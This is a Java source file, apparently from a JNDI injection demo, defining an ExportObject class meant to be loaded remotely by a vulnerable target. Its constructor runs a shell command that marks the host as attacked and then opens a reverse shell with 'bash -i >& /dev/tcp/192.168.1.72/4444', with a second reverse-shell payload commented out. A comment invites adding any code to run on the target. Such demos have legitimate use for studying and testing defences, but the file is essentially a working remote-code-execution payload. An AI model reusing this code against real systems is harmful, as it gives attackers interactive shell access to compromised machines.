package com.rajasoun.jndi;

import javax.naming.Context;
import javax.naming.Name;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Hashtable;

import java.io.*;

/**
 * ExportObject class is served via HTTP for URLClassloaders
 * the bytecode of this constructor is patched in the {@link HttpServer} class
 * by adding a new Runtime.exec(Config.command) to the top of the constructor
 * feel free to any code you want to execute on the target here
 */
public class ExportObject implements javax.naming.spi.ObjectFactory {
    // Reset
    public static final String RESET = "\033[0m";  // Text Reset

    // Underline
    public static final String RED_UNDERLINED = "\033[4;31m";    // RED

    // Regular Colors
    public static final String RED = "\033[0;31m";     // RED
    public static final String GREEN = "\033[0;32m";   // GREEN

    public ExportObject() throws IOException {
        System.out.println(ExportObject.RED_UNDERLINED + "[Malicious Code Injection]" + ExportObject.RESET);
        final String command = "echo -e \"[Malicious Code Injection]\nDate: $(date) \n By: $(hostname)\" > /tmp/attacked.txt";
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("/bin/bash", "-c", command);
        Process process = processBuilder.start();
        printResults(process);
        System.out.println(ExportObject.RED + "Remote Code Execution (RCE) : Successful \n" + ExportObject.RESET);
        System.out.println(ExportObject.GREEN + "Run In Reverse Shell -> cat /tmp/attacked.txt\n" + ExportObject.RESET);
        launchReverseShell();
    }

    public static void launchReverseShell(){
        try {
            String[] payload = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.1.72/4444 0>&1"};
            //String[] payload_b = {"/bin/bash", "-c", "exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"};
            Process p = Runtime.getRuntime().exec(payload);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void printResults(Process process) throws IOException {
        BufferedReader reader;
        reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }

    public static void main (String[] args ) throws IOException {
        System.out.println("Export Object");
        new ExportObject();
    }
}
